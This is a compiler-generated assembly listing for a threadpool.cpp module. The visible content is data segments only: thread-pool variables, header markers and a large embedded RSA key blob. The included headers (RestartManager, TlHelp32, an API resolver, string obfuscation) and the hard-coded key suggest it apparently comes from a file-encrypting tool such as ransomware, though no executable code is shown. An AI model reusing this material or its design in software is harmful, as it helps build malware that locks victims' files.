; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?g_LocalThreadPool@@3Uthreadpool_info@@A	; g_LocalThreadPool
PUBLIC	?g_NetworkThreadPool@@3Uthreadpool_info@@A	; g_NetworkThreadPool
PUBLIC	?g_PublicKey@@3PAEA				; g_PublicKey
_BSS	SEGMENT
?g_LocalThreadPool@@3Uthreadpool_info@@A DB 050H DUP (?) ; g_LocalThreadPool
?g_NetworkThreadPool@@3Uthreadpool_info@@A DB 050H DUP (?) ; g_NetworkThreadPool
_BSS	ENDS
msvcjmc	SEGMENT
__0ED14FEE_winpackagefamily@h DB 01H
__F92EF742_winapifamily@h DB 01H
__22E515EB_sdkddkver@h DB 01H
__FE09AF47_concurrencysal@h DB 01H
__C073CA79_sal@h DB 01H
__D6AFE870_vadefs@h DB 01H
__D63E96CF_vcruntime@h DB 01H
__514B86D7_excpt@h DB 01H
__9A7D38D9_stdarg@h DB 01H
__29F49F40_specstrings_undef@h DB 01H
__D0F42932_specstrings_strict@h DB 01H
__F00405FD_sdv_driverspecs@h DB 01H
__173E09CA_driverspecs@h DB 01H
__9A452361_specstrings@h DB 01H
__1B0272D9_corecrt@h DB 01H
__74484FB3_corecrt_wctype@h DB 01H
__1EC467ED_ctype@h DB 01H
__98517906_kernelspecs@h DB 01H
__D3497022_basetsd@h DB 01H
__61CC25A1_errno@h DB 01H
__3EADF068_vcruntime_string@h DB 01H
__E4C945B4_corecrt_memcpy_s@h DB 01H
__8EAFF484_corecrt_memory@h DB 01H
__6490AEC5_corecrt_wstring@h DB 01H
__E8295E1E_string@h DB 01H
__7FCB5136_guiddef@h DB 01H
__FF8A9E11_pshpack4@h DB 01H
__D5438902_poppack@h DB 01H
__FB07E2A3_pshpack2@h DB 01H
__F6906775_pshpack8@h DB 01H
__F9415CFA_pshpack1@h DB 01H
__E58C6F1C_apiset@h DB 01H
__A5C52262_ktmtypes@h DB 01H
__FBBA8F9D_winnt@h DB 01H
__A32D3D2C_minwindef@h DB 01H
__7D798299_windef@h DB 01H
__9AE108E9_apisetcconv@h DB 01H
__9CE53D2C_minwinbase@h DB 01H
__5D0AA210_apiquery2@h DB 01H
__4DD4E726_processenv@h DB 01H
__3575CC96_fileapi@h DB 01H
__8EA220E6_fileapifromapp@h DB 01H
__BF9B31FE_debugapi@h DB 01H
__C3AFE134_utilapiset@h DB 01H
__76F69E51_handleapi@h DB 01H
__7E63D784_errhandlingapi@h DB 01H
__FFA7003C_fibersapi@h DB 01H
__8971CECF_namedpipeapi@h DB 01H
__46C9D8A6_profileapi@h DB 01H
__98D4F0A3_heapapi@h DB 01H
__50EF2A88_ioapiset@h DB 01H
__92EA1464_synchapi@h DB 01H
__A53D8AED_interlockedapi@h DB 01H
__B506CAAF_processthreadsapi@h DB 01H
__FF735694_sysinfoapi@h DB 01H
__29589789_memoryapi@h DB 01H
__E9C7A663_enclaveapi@h DB 01H
__D035F9F7_threadpoollegacyapiset@h DB 01H
__C899130C_threadpoolapiset@h DB 01H
__E0441EE7_jobapi@h DB 01H
__CEF86838_jobapi2@h DB 01H
__35AC6B9A_wow64apiset@h DB 01H
__C8AE41A5_libloaderapi@h DB 01H
__CC9E232D_securitybaseapi@h DB 01H
__C9D0C9B8_namespaceapi@h DB 01H
__30FF9CAD_systemtopologyapi@h DB 01H
__4D358795_processtopologyapi@h DB 01H
__40446D10_securityappcontainer@h DB 01H
__3A952EDF_realtimeapiset@h DB 01H
__F4865F4B_winerror@h DB 01H
__53C1BD93_timezoneapi@h DB 01H
__1FFBEDBF_winbase@h DB 01H
__43D3FA34_wingdi@h DB 01H
__D24A7391_tvout@h DB 01H
__7713A6C8_winuser@h DB 01H
__0B345F71_datetimeapi@h DB 01H
__9AC6960C_winnls@h DB 01H
__973A40A8_stringapiset@h DB 01H
__CC46FEE2_wincontypes@h DB 01H
__97D70BE1_consoleapi@h DB 01H
__27EC5E18_consoleapi2@h DB 01H
__262E342F_consoleapi3@h DB 01H
__641DCD70_wincon@h DB 01H
__5A96C7A7_verrsrc@h DB 01H
__B69C6FF2_winver@h DB 01H
__7AEB8C37_reason@h DB 01H
__59F1A8A9_winreg@h DB 01H
__EE0E2B7F_wnnc@h DB 01H
__DCDB7054_winnetwk@h DB 01H
__EDC72EEB_cderr@h DB 01H
__95F9199D_dde@h DB 01H
__66427627_ddeml@h DB 01H
__957C29A0_dlgs@h DB 01H
__12EA15AF_lzexpand@h DB 01H
__62131F15_mmsyscom@h DB 01H
__47E68D49_mciapi@h DB 01H
__5D7DD356_mmiscapi@h DB 01H
__7223D2EF_mmiscapi2@h DB 01H
__A330DBB3_playsoundapi@h DB 01H
__601B366F_mmeapi@h DB 01H
__1134ADD5_timeapi@h DB 01H
__93F2265A_joystickapi@h DB 01H
__DF6EB4E3_mmsystem@h DB 01H
__BD641FCB_nb30@h DB 01H
__DF8704F0_rpcdcep@h DB 01H
__5C6CA7BB_rpcdce@h DB 01H
__853533C4_rpcnsi@h DB 01H
__2D2406C3_rpcnterr@h DB 01H
__64521D71_rpcasync@h DB 01H
__AADCBA08_rpc@h DB 01H
__19E26CFF_shellapi@h DB 01H
__1E9F31D3_winperf@h DB 01H
__32C6F875_winsock@h DB 01H
__7953A3F8_bcrypt@h DB 01H
__E4169492_ncrypt@h DB 01H
__AF3DDDC3_dpapi@h DB 01H
__D1E23BF2_wincrypt@h DB 01H
__82AB4779_winefs@h DB 01H
__1FE431C9_rpcnsip@h DB 01H
__2B741F2D_rpcsal@h DB 01H
__92623256_rpcndr@h DB 01H
__9C18532E_wtypesbase@h DB 01H
__EA2E1D6D_wtypes@h DB 01H
__7DDD9F45_winioctl@h DB 01H
__E550A843_winsmcrd@h DB 01H
__9809C1BA_winscard@h DB 01H
__EA174FA4_prsht@h DB 01H
__0E1BD114_winspool@h DB 01H
__45DED006_corecrt_malloc@h DB 01H
__13F5961F_stddef@h DB 01H
__FD6DBD68_corecrt_search@h DB 01H
__E2E33A61_corecrt_wstdlib@h DB 01H
__10D4A829_limits@h DB 01H
__6E5ACABA_stdlib@h DB 01H
__30B1AFDA_unknwnbase@h DB 01H
__328C1996_objidlbase@h DB 01H
__C4E06B6A_cguid@h DB 01H
__434718C5_combaseapi@h DB 01H
__DE6FDEF1_unknwn@h DB 01H
__CCE0BACC_objidl@h DB 01H
__8C7011E5_oaidl@h DB 01H
__2E0B7863_propidlbase@h DB 01H
__BF4CF2EC_coml2api@h DB 01H
__6D897344_oleidl@h DB 01H
__1129FC2C_servprov@h DB 01H
__757952E4_msxml@h DB 01H
__B1191D53_urlmon@h DB 01H
__404D1A47_propidl@h DB 01H
__A1C63593_objbase@h DB 01H
__C1B0A9CB_oleauto@h DB 01H
__24EAF61F_ole2@h DB 01H
__2B1843DA_commdlg@h DB 01H
__81DDEDE3_stralign@h DB 01H
__2134D1B4_winsvc@h DB 01H
__11C07376_mcx@h DB 01H
__577CE3E7_ime_cmodes@h DB 01H
__1E72C31E_imm@h DB 01H
__E15BF856_windows@h DB 01H
__832A4112_inaddr@h DB 01H
__C59B8995_ws2def@h DB 01H
__F9202461_qos@h DB 01H
__50CB22FA_WinSock2@h DB 01H
__32E3D3D2_xkeycheck@h DB 01H
__CFD6EDFA_yvals_core@h DB 01H
__BE6CFB00___msvc_sanitizer_annotate_container@hpp DB 01H
__A3D3E4E8_vcruntime_new@h DB 01H
__8D1A214D_vcruntime_new_debug@h DB 01H
__935DC21B_crtdbg@h DB 01H
__497BC13E_crtdefs@h DB 01H
__DDE8D0E0_use_ansi@h DB 01H
__AE7FBCDF_yvals@h DB 01H
__44420885_corecrt_stdio_config@h DB 01H
__AB601D8D_corecrt_wstdio@h DB 01H
__C1EC35D3_stdio@h DB 01H
__1C5946C5_cstdio DB 01H
__54ADA280_cstring DB 01H
__EF1F6BBA_corecrt_wconio@h DB 01H
__3D1D430C_corecrt_wdirect@h DB 01H
__8ECB7138_corecrt_share@h DB 01H
__DB7FEBA6_corecrt_wio@h DB 01H
__9A9F0068_corecrt_wprocess@h DB 01H
__369A9BC3_corecrt_wtime@h DB 01H
__CE789B9D_types@h DB 01H
__9901C817_stat@h DB 01H
__3FCAD62E_wchar@h DB 01H
__86D29096_cwchar DB 01H
__26E6E2A9_xtr1common DB 01H
__C51215A0_iosfwd DB 01H
__AEA28616_stdint@h DB 01H
__A561EB1D_cstdint DB 01H
__BB16330F_corecrt_math@h DB 01H
__3BF2A406_math@h DB 01H
__183F0A60_cstdlib DB 01H
__B9985323_float@h DB 01H
__6F1D8D42_cfloat DB 01H
__9CD02892_climits DB 01H
__F5A7E1DF_intrin0@inl@h DB 01H
__50567835_intrin0@h DB 01H
__09FBC026_limits DB 01H
__BDF4D0CD_cstddef DB 01H
__7C4A1519_type_traits DB 01H
__FA77ED4C_malloc@h DB 01H
__89766DA4_corecrt_terminate@h DB 01H
__EEF52EF9_eh@h DB 01H
__85F4241F_vcruntime_exception@h DB 01H
__8124AFA8_exception DB 01H
__5003AD96_new DB 01H
__8B28237E_xatomic@h DB 01H
__E4CFD974_initializer_list DB 01H
__2F328FEB_utility DB 01H
__91F58E7E___msvc_iter_core@hpp DB 01H
__C27AFEEB_xutility DB 01H
__45A7EC28_xmemory DB 01H
__31746AB4_xstring DB 01H
__1392A162_cctype DB 01H
__C1864A34_string DB 01H
__9D469CC8_common@h DB 01H
__AE454FA2_lmcons@h DB 01H
__67F5F762_mprapidef@h DB 01H
__1F2B86E1_ipifcons@h DB 01H
__EFFE9D94_ifdef@h DB 01H
__AF31E881_ifmib@h DB 01H
__8BC2807C_nldef@h DB 01H
__7ABE0907_ipmib@h DB 01H
__2E95CCCA_tcpmib@h DB 01H
__2798F2DA_udpmib@h DB 01H
__FCC255DB_iprtrmib@h DB 01H
__B01BC3FD_in6addr@h DB 01H
__D834A143_ipexport@h DB 01H
__0A9237D2_time@h DB 01H
__82EB0637_iptypes@h DB 01H
__6063C472_tcpestats@h DB 01H
__63D3B6A5_netioapi@h DB 01H
__D1674A86_iphlpapi@h DB 01H
__F5D3A320_RestartManager@h DB 01H
__AAAC9FBE_TlHelp32@h DB 01H
__9B49ECA4_getapi@h DB 01H
__ED66B863_memory@h DB 01H
__8070D656_threadpool@h DB 01H
__016BD130_queue@h DB 01H
__3106C9CE_memory@h DB 01H
__93890D6E_filesystem@h DB 01H
__62F75DE5_metarandom2@h DB 01H
__93160BA8_array DB 01H
__722C6D77_MetaString@h DB 01H
__F03EEA68_threadpool@cpp DB 01H
msvcjmc	ENDS
_DATA	SEGMENT
?g_PublicKey@@3PAEA DB 07H, 02H, 00H, 00H, 00H, 0a4H, 00H, 00H, 'RSA2', 00H
	DB	010H, 00H, 00H, 01H, 00H, 01H, 00H, 0b5H, 0b4H, 0dcH, 'U', 0feH
	DB	'k', 0c0H, 05H, 'e', 0d1H, 0d0H, 07H, '_', 0dfH, 0faH, 018H, '@'
	DB	0e0H, 0d5H, 0c2H, 0d2H, 0f8H, 0fbH, 0daH, '7', 0f7H, 01dH, 0d6H
	DB	090H, 08cH, 0e6H, 0c0H, 'g3', 091H, 0aaH, '>', 09aH, 099H, 0faH
	DB	'!Ad', 0e0H, 'Ax', 010H, 0b7H, '6', 017H, 'Yo', 0a1H, 0d3H, '~'
	DB	'[', 0bH, 0c6H, 0bfH, 0f5H, 089H, 0fbH, 'o', 0f4H, 0e8H, 0c2H, 0ecH
	DB	096H, 0d6H, 098H, 0cdH, 0fdH, 'X', 0fbH, 0a5H, 0dfH, 0d8H, 015H
	DB	'@o4}', 0f1H, 0fbH, 0e1H, 0ebH, 'N', 0d2H, 'Ncp^h', 08eH, 'B', 01eH
	DB	0adH, '~', 085H, '@', 0feH, 084H, 0adH, 0b6H, 0e0H, 0a4H, '``', 0bbH
	DB	01H, 0c8H, 0f3H, '65', 084H, 0e1H, 0d0H, 'X', 01bH, 0beH, 'X', 0ccH
	DB	'''u|', 0c5H, 0b1H, 0e4H, 0deH, ':K', 08cH, 0d8H, '5$', 08aH, 088H
	DB	084H, 'tY!', 0a2H, ';', 0d7H, 082H, 0b2H, 017H, 00H, 089H, 083H
	DB	0e0H, 'pT', 0e3H, 0dfH, '\Ug', 019H, 'I', 0e6H, 'D', 0a0H, ' "'
	DB	':S', 09aH, 0bfH, 0cdH, 'Ls9ZS', 0a2H, 0deH, 0a5H, 0fcH, 01cH, '_'
	DB	'\', 083H, 0bfH, 098H, 'n', 0bcH, '!//Pwy', 0f3H, 'K', 0dH, 0b0H
	DB	0e1H, 0fcH, 0e7H, 08eH, 0d5H, 0daH, 'F', 089H, 0aeH, 'SO\', 0b0H
	DB	'c', 0faH, '?bO', 088H, 0e0H, '''Ma', 0b0H, 01eH, 0deH, 't`', 081H
	DB	0ddH, 0b5H, 'Rt', 0eH, '(', 091H, 018H, 0baH, '\', 094H, 099H, 'E'
	DB	08aH, 0bbH, 0cdH, 089H, 0e0H, 0dH, 0ccH, '/', 091H, 0dH, 0a4H, 0bfH
	DB	'P', 0dcH, 0bcH, 'E', 0bH, 'B', 0aeH, '2', 0abH, 01fH, 015H, 0c1H
	DB	')', 0a3H, '|U$', 095H, 0b9H, '}', 017H, 03H, '2', 081H, 0c6H, 'c'
	DB	08H, '2', 0eeH, '7)', 0beH, 091H, 0c2H, '&T', 0c8H, '4GA,Q', 0fbH
	DB	'p', 08aH, 0cH, '5:', 0e3H, '5d*M', 0b9H, 0f2H, 0d8H, 02H, 08aH
	DB	0feH, 0bfH, 0d0H, 'T', 07fH, 0deH, '5', 0bfH, 0ccH, 0d1H, '%', 0ecH
	DB	'B', 093H, 0beH, 0cH, 0aeH, 017H, 0eH, 0b8H, 06H, 'd;0z7', 014H
	DB	018H, 083H, 'j[', 0d7H, 0b7H, '!G', 018H, 0ecH, 0f1H, 093H, 'u'
	DB	0bcH, 0d2H, '1', 092H, 'H', 0b2H, 08eH, 01fH, 0b5H, 'x', 010H, 0bH
	DB	010H, '}"', 089H, 0f0H, 'Z', 083H, 0c4H, 04H, 0afH, 0a5H, 'D', 090H
	DB	0c1H, 0b6H, 082H, 0bbH, 03H, 09H, 'E', 087H, 0ecH, 'I', 0e4H, 'F'
	DB	'Xp', 096H, 07H, 'm', 093H, 0adH, 0b6H, 'GK', 0deH, 011H, '#Dg'
	DB	'g>', 0e0H, 'Y[', 0cdH, 'lVx', 0d4H, ';', 017H, 0baH, 09cH, 0a1H
	DB	'@', 086H, 016H, 0fbH, 0a7H, '\', 0dcH, 'L', 080H, 09H, 0bfH, 0ddH
	DB	0b4H, 0a8H, 0bH, 0e5H, 0d4H, 'D', 0eH, '^', 0bdH, 0c4H, 0d0H, '@'
	DB	'R', 0dH, 'B', 013H, 010H, '.', 0f7H, 0a6H, 0a1H, 0e0H, '@', 0b1H
	DB	0b9H, 'qr', 0dfH, 0f1H, 092H, 085H, 0caH, '*f', 0c6H, 0a3H, 013H
	DB	089H, '.', 0bbH, 01dH, '2', 0e9H, 01eH, 0ddH, '+F', 0e3H, 0deH
	DB	0f9H, 09aH, 0e3H, 'O', 0e2H, 09bH, 02H, 0e8H, '1', 090H, 0b7H, 'X'
	DB	097H, 09fH, 'C', 0fH, 'Q6', 0d9H, 0aeH, 'X', 0acH, 018H, 0fcH, 0eH
	DB	013H, 0b0H, 'y', 0baH, 0d3H, 0bdH, 09fH, 'XU', 0b1H, 0fH, 0f2H
	DB	0cH, '$IU', 0b1H, 0b7H, 0bfH, 03H, 0e3H, 0d1H, 0a4H, 0efH, 0b5H
	DB	'?|uXH', 0aaH, 097H, 012H, '5', 0a0H, 0eeH, 'c")', 0dH, 0d8H, 01aH
	DB	'WX', 07fH, 'X', 0c0H, 'NP', 0f2H, 0a8H, 01dH, 0fH, 'e', 0b5H, 0e7H
	DB	014H, '8sEGM', 0bH, 'MI', 0fH, 0d4H, 06H, 096H, 0b7H, 0e0H, 'N'
	DB	084H, 0c6H, 'd&4', 0cdH, 0a8H, 'd', 0fdH, 0e2H, 'Q', 0e2H, 'Fp'
	DB	'F', 04H, 'e', 03H, 'r', 0ecH, 0c7H, 'K`', 0b8H, 'A:j`', 012H, 0e3H
	DB	'gw', 017H, 0cH, 'cv', 099H, 0ebH, 04H, 01eH, 0ddH, 08dH, 'b', 0bcH
	DB	0aaH, 096H, 0e6H, 'j', 01fH, 0eeH, 0feH, 091H, 089H, 0a7H, 095H
	DB	'5j', 019H, 0ccH, '"', 0dH, '7`', 0fcH, 092H, '3', 0f4H, 06H, '8'
	DB	01eH, 0eaH, 09cH, 09cH, '*]9', 0d4H, 0f9H, 0e7H, 0baH, 'y', 0ddH
	DB	'n', 0eH, 0ebH, 'v4(N', 085H, 0dfH, 0e2H, 0a4H, 0c6H, 'GB', 098H
	DB	'(', 0d0H, '7', 0dbH, '85', 0ddH, '6;D+Y!', 018H, '11', 0a1H, 0d3H
	DB	0b6H, 09dH, '%', 0bH, 0dcH, 0fH, '_', 088H, '!g', 0b5H, 'T', 0f4H
	DB	'=', 0deH, 016H, 084H, 0abH, 0e8H, 094H, 085H, 083H, 099H, 0d0H
	DB	0a3H, 0a9H, 01dH, 0eH, '4@', 03H, 0e0H, 011H, 'Y;i', 090H, 01H
	DB	0a4H, ';o', 090H, 0d7H, 'P', 0c0H, 0d9H, 'P~Uy+N', 0b8H, '6', 09dH
	DB	'A}', 0c8H, 0c2H, 'Y', 0d1H, 0cbH, 084H, 0e2H, 0d6H, 0b9H, 0cdH
	DB	07H, 'w', 0a5H, '-ah', 081H, '"', 012H, '1', 014H, 0c9H, 0fbH, 0a0H
	DB	0feH, 095H, 0abH, 'W', 02H, 01aH, 04H, 0bH, 0c4H, 0b4H, 0dbH, '6'
	DB	08bH, 'X', 00H, '5', 0f2H, 'L', 0adH, 0ebH, 'u{I', 0e7H, 085H, ''''
	DB	'Q', 014H, 014H, 090H, 0f6H, 0b8H, 08bH, 0dcH, 'i', 0a1H, '6b', 0cbH
	DB	'c:', 094H, 09dH, 0dfH, '%3', 08eH, 0fbH, 087H, 'G', 0abH, 'u', 0f8H
	DB	0ebH, ',', 0b5H, 091H, 09cH, 0a0H, 0d2H, 0e2H, 06H, 0b5H, 0adH
	DB	'2s', 09cH, 'P(DS5', 0faH, 'z2', 083H, 'g9 G}', 0a8H, 096H, 'M'
	DB	03H, 0c1H, '~', 0d1H, 0f5H, 0a8H, '^', 011H, 0f0H, 'D', 019H, 01dH
	DB	03H, 0c7H, 0bbH, 0fdH, 013H, 'u', 0d8H, 0c3H, 0feH, 0f4H, 0feH
	DB	0bdH, 0bbH, '$', 0c6H, 'u', 0aaH, '{K', 08bH, 0b9H, 0a6H, 'bC', 0e5H
	DB	'c', 0eH, 0c8H, 0ecH, 0c6H, '%\J', 0afH, 0a0H, '7', 086H, 087H
	DB	0b7H, 07H, 'a', 017H, 08fH, 0c0H, '7', 0a0H, 0e0H, 'o', 09H, 'x'
	DB	010H, 'cj', 0acH, 01eH, 0b3H, '|', 01aH, 0d7H, 0b3H, '|k', 01aH
	DB	'u4', 094H, '_', 0abH, 0d7H, '9', 0f5H, 03H, 0fbH, '-80\', 0f0H
	DB	'5', 015H, '.', 0e8H, 0c4H, 08dH, 0eaH, '+|l', 0b4H, 094H, '[', 07fH
	DB	081H, 01aH, 0ffH, 096H, 0d5H, 0bdH, 0bcH, 09eH, 089H, '\', 0d8H
	DB	'E', 0e9H, 'H', 0ceH, '+p_', 0a2H, 093H, '7', 0fcH, '''z', 0a1H
	DB	0eeH, '''', 08H, 0a8H, ';_', 01aH, 0c3H, 0e1H, 01eH, 0c9H, '=P'
	DB	'R', 084H, 0ebH, '1', 0c2H, '''', 0ccH, 015H, 0f7H, 'bT', 0a4H
	DB	010H, 0d1H, 0b0H, 'K3', 0caH, 0a1H, 'O', 09cH, 'dq', 0c8H, 'b', 0d3H
	DB	0c4H, 0e1H, 0abH, 0cbH, 'PL', 0b9H, 097H, 'Q', 0caH, 0e8H, ':M'
	DB	013H, 'n', 09dH, 0fbH, 0ccH, 011H, 0a6H, 0bcH, 'H', 0ceH, 't7N'
	DB	'O', 0adH, 0e1H, 0e1H, 08aH, '@', 0d2H, 0f7H, 00H, '$<', 08H, '"'
	DB	016H, 0a4H, '?]', 090H, 0b8H, ')''', 0d1H, '1u', 0cdH, 0aeH, 0aaH
	DB	0b7H, 0f2H, 0e0H, 0b7H, 0cfH, '/1,', 0caH, 09cH, 083H, 0ddH, ''''
	DB	09fH, 014H, 0acH, 088H, 09bH, 0c0H, 0cfH, 0b5H, 0f9H, 09dH, 'n'
	DB	0a7H, 0c5H, 04H, 0dbH, '<', 084H, 0b5H, '7I', 086H, 0d0H, '<w', 07H
	DB	06H, 0b7H, 01dH, 0e4H, 0a4H, 'V', 07H, 09bH, 0daH, 0e2H, 'M.9', 016H
	DB	0e1H, 08cH, 0f4H, 0afH, 0dcH, 012H, '(', 0e8H, 09aH, 'y', 0ceH
	DB	't', 0aeH, 0b5H, 0ffH, 010H, 0e5H, 'O}', 016H, 0b8H, '*', 01eH
	DB	099H, 0bH, 0cbH, 0f8H, 0eH, 0bdH, 0c2H, 00H, 'M', 0ffH, 0dfH, 086H
	DB	'w2', 0a4H, 0cbH, 0aaH, 0fdH, 096H, 080H, 0b2H, 0feH, 0c1H, 0abH
	DB	0b1H, 087H, 'C', 09dH, '(e', 0d5H, 080H, 'w', 0b8H, 'L1', 0b7H
	DB	'>', 0a2H, '[', 0c4H, 012H, 'E(Y', 019H, 0d9H, 0c0H, 0a7H, '"', 0ffH
	DB	09bH, 0afH, 0e7H, 'K', 00H, 07H, 0b6H, 096H, 0cfH, 'k', 09cH, 017H
	DB	089H, 'j', 0daH, 'a', 0c7H, 0eH, 015H, 082H, 0faH, 093H, 'S', 08dH
	DB	'.', 011H, '&', 0c2H, 01H, 0e2H, 0beH, '+', 011H, 'z', 0ebH, 'W'
	DB	'c', 0cfH, 0b3H, ')', 0e8H, 0a0H, 'E\`', 01dH, '?D_F', 088H, 09eH
	DB	06H, '6', 0f2H, 'A', 0caH, 0aaH, 0c5H, '&', 0fdH, 'b', 0d5H, 0f9H
	DB	'h', 0fcH, 015H, 08cH, 0e3H, 090H, 082H, 0ecH, 'O', 0d2H, 'D', 0abH
	DB	01aH, ':', 096H, 'o', 01cH, 0ceH, 091H, 096H, 0edH, 0d6H, 0dcH
	DB	'''>', 0c7H, 'c!:', 0d7H, 'gn', 01cH, '7', 0bcH, 0f3H, '7`', 01cH
	DB	'3', 0c7H, 'wK', 0deH, 019H, 0ebH, 09H, 01dH, 0e8H, 09fH, '|1', 0b6H
	DB	0e2H, 0eeH, 015H, 017H, 01aH, '9', 0e2H, 0f8H, 'm', 0d1H, 'C;u'
	DB	017H, 0e8H, ' ', 088H, 'vPQf', 0d8H, 'a', 0b9H, 'mSW', 0a7H, 0ddH
	DB	'Ft', 084H, 0f2H, '?', 0f7H, '+', 0e9H, 014H, 0f1H, 0f3H, 0bdH
	DB	09H, 0ccH, 09bH, '[', 018H, 0d3H, 0f9H, 01eH, 'm', 01aH, '!', 0b4H
	DB	'P', 05H, '{', 01aH, '_', 0f5H, 'Z', 093H, 089H, 0a3H, '8', 0a4H
	DB	'P,V', 0beH, 0c3H, 0dcH, 085H, 08eH, 0edH, 0b9H, 099H, 'W', 0d8H
	DB	0d7H, 0ceH, 0b5H, 0bdH, 01eH, 0d2H, 0adH, 018H, 09H, 'N', 0f1H
	DB	'/', 0faH, 0caH, '-', 0cfH, '{', 0b9H, 00H, 09bH, 'p', 0fbH, 0b1H
	DB	'a', 012H, 01aH, 0e1H, '=0', 0ddH, 0c2H, 083H, 0f4H, 0d3H, '|', 0f8H
	DB	0f0H, 'I', 0e9H, 01H, 02H, 0e3H, '%', 01cH, 0e7H, '!', 00H, 0afH
	DB	0bfH, 0cdH, '(f', 0cfH, 01cH, 0cH, 0d4H, 0f6H, 'ai<#w', 0d4H, 0a6H
	DB	'3', 0a3H, 0b7H, 0d9H, '8', 0afH, 08dH, 0ffH, '[J', 083H, 06H, 0e2H
	DB	09dH, 0ecH, 'A0', 08bH, 0fcH, 'v', 07fH, '+b', 0deH, '8', 0b8H
	DB	087H, 0dcH, 0aH, 'v', 0ffH, 0e2H, 0e0H, 0dfH, '-c', 0faH, 083H
	DB	'l(', 0dH, 0bcH, 095H, 0c7H, 'LS', 0d3H, 09eH, 'i', 093H, 'J', 0e3H
	DB	'~', 090H, 0a1H, '^', 0b0H, 'I', 0f4H, '''h', 0cH, 0a9H, 082H, 0cH
	DB	0f3H, 0b3H, 'T', 0a5H, 0a3H, 0c7H, 'o>', 0deH, 08H, '_', 0a5H, 'W'
	DB	0baH, 'Q', 0fbH, 0d6H, 'K', 010H, 0f4H, 'b', 094H, 08H, 0dH, '4'
	DB	0acH, 'jXK', 0c0H, 015H, 0e7H, 0ddH, ')', 0d2H, 0fdH, 095H, 09cH
	DB	'ZO', 0e2H, 'l)', 0ebH, 0d4H, 'z', 0a0H, 0daH, 'i', 0e7H, 'ES', 0dbH
	DB	06H, 'R_', 081H, '1', 0cdH, 01aH, 08cH, '5', 092H, 'b', 08bH, 09H
	DB	0bcH, 0cfH, 'W', 0c2H, 0aH, 'a', 04H, 's[', 0afH, 0bbH, 0a5H, 0a5H
	DB	080H, 0e8H, ':', 0c1H, 080H, 0b5H, 'Q', 01eH, '#A', 0c3H, 0c1H
	DB	0aH, 080H, 'R', 0c5H, 0b1H, 091H, 084H, 0dcH, 0edH, '(', 0b2H, 0c1H
	DB	'96', 081H, 015H, 0b8H, 094H, '1I', 019H, 0deH, 0aH, 0d0H, 0fH
	DB	0a2H, '\', 0faH, 0aaH, 0d2H, 02H, 082H, 0b7H, '>7V', 09dH, '?K'
	DB	096H, 0d6H, 0fH, 087H, 'i', 087H, 010H, 00H, 0fbH, 018H, 09dH, 0d2H
	DB	0e8H, 0faH, 0c4H, 'QMdi}', 07H, 0ecH, 0e3H, 096H, 'c', 0d2H, '/'
	DB	09H, 0a2H, 015H, 'u', 0cbH, 'h7_', 0b4H, 0e4H, 'IU', 0cfH, '[', 085H
	DB	08bH, 08eH, 015H, 'e(', 0b7H, '[se', 018H, 'Zq', 0eeH, 0b3H, 0efH
	DB	0f0H, 09aH, '1', 0e9H, 'S', 0eH, 0dcH, 0faH, 096H, 'S=', 0caH, 0b0H
	DB	'}GU', 0c9H, 'U', 0a7H, '@', 018H, 09dH, 0feH, '|', 08dH, 0c8H
	DB	't', 0e3H, '}', 096H, 082H, 0a5H, 088H, 0f4H, 015H, 0b6H, 087H
	DB	014H, '0`', 089H, 02H, '}', 0eeH, 'Q', 0e3H, 'OO', 0feH, 00H, 'M'
	DB	09H, 092H, 'a;', 09fH, 0bbH, 0deH, 0c9H, 05H, '*', 0cH, '?%S', 0c1H
	DB	0d7H, '#j', 0aeH, 'D:+', 0faH, 0c7H, 0afH, 0caH, 0c4H, 0d6H, '&'
	DB	0f9H, 0dfH, 09aH, 'E', 0c0H, 0bcH, 0f9H, 0fbH, ',', 0e4H, 09bH
	DB	099H, 0a6H, 0b2H, 0adH, 0ffH, 'p', 0cH, 'K', 01eH, 0b2H, '_K', 091H
	DB	'R', 0daH, '4W', 09eH, 0b2H, ';O', 0d9H, '$A,}', 096H, 0aH, '&'
	DB	0dcH, 0cH, 0f0H, 0b2H, 's', 00H, 'G', 0dcH, '8S', 082H, 'n%', 07fH
	DB	'vKA', 0efH, 'o', 081H, 0aH, 0c3H, 098H, 'V^!', 0c8H, 'I8n!$', 0e5H
	DB	011H, 09cH, 0fH, 0e9H, 'b', 096H, 'm', 0bH, 'g', 0cbH, 'B', 0faH
	DB	'H', 08aH, 'W', 08dH, 's', 0c8H, 088H, 04H, 0a8H, 09bH, 0ceH, 01dH
	DB	096H, 0f5H, 0b4H, 083H, 0adH, 0a3H, 0ffH, 0f5H, 'a', 014H, 0bdH
	DB	0f0H, 'g', 09bH, 0e3H, '\', 07fH, 012H, 0ffH, 'aP', 0faH, '~', 0c5H
	DB	'E!', 0e2H, 0ffH, '8|q', 0d0H, 0afH, 0e9H, 0f9H, 0a1H, 0aeH, 'u'
	DB	01dH, 0e8H, 0faH, '"', 0beH, 0e2H, 'q', 0f7H, 07H, 01eH, 0bdH, 014H
	DB	'K', 00H, 'L>', 0a0H, 015H, 0ccH, 0a3H, '^.l@', 09aH, '!),x', 014H
	DB	0ecH, 0eeH, 080H, '$\', 0ccH, '2', 0a6H, '9K', 0baH, 0a9H, 'j', 0e9H
	DB	')', 0b3H, 'H7', 0cfH, 0aH, 'D', 01cH, 'jC', 0b8H, ')}', 0dcH, 'm'
	DB	'4', 08bH, 0a0H, 'U=', 0ddH, 09bH, '_..', 081H, 0afH, '/', 084H
	DB	0a4H, 01H, 0acH, 0eaH, 09dH, 'i', 0f9H, 0b4H, ')', 03H, 'P', 0cH
	DB	'T', 08cH, 02H, 090H, '1', 0c7H, 'p', 0c6H, 09cH, 'v', 08dH, 0a0H
	DB	09H, ';', 094H, 01H, 0acH, '/', 0bH, 'V', 0c9H, 01fH, 086H, 01dH
	DB	099H, 0f4H, 'q', 0f6H, 094H, 083H, 09cH, '9', 0e4H, 0dfH, 's', 09aH
	DB	01dH, 'lC', 0a4H, '(', 018H, 0faH, 0b9H, 0b6H, 02H, 'pf4', 0acH
	DB	0f9H, 09bH, 016H, '%', 08bH, 0b2H, 'KE', 0c2H, 'Q', 0d6H, 0fH, 'c'
	DB	080H, 0dbH, 0d0H, 'Q', 0ebH, 'A', 0ccH, 013H, 0d6H, 017H, 'Y', 0d7H
	DB	0ccH, 01eH, 'E', 091H, '+>', 0eH, '3', 0cH, 09H, 0b7H, 01bH, 'c'
